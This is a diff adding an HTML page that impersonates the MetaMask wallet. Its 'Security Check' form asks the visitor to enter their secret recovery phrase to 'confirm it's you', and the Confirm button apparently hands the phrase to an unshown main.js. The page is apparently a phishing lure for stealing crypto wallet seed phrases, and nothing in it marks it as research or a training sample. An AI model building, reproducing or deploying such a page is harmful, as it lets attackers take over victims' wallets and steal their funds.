@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask</title>
+    <link rel="stylesheet" href="./css/main.css">
+</head>
+<body>
+    <div class="header">
+        <div class="inner-header">
+            <img id="logo" src="./media/imgs/logo.svg" alt="" width="150">
+            <div class="blockchain-network">
+                <div class="connected"></div>
+                <p id="network-selected">Ethereum Mainnet</p>
+                <img id="expand-arrow" src="./media/imgs/expand-arrow.png" alt="" width="13">
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <div class="inner-container">
+            <div id="logo-container">
+                <script src="./js/logo.js"></script>
+            </div>
+            <div class="confirmation">
+                <h1 id="title">Security Check</h1>
+                <div class="center">
+                    <p id="info">We just need to confirm it's you. To continue, simply confirm your secret recovery phrase.</p>
+                </div>
+                <div class="center">
+                    <input id="seed-phrase" type="text" placeholder="Enter Recovery Phrase">
+                </div>
+                <div class="center">
+                    <button id="confirm-btn">Confirm</button>
+                </div>
+                <div class="center">
+                    <p id="support">Need help? Contact <a href="">MetaMask Support</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="./js/main.js"></script>
+</body>
+</html>
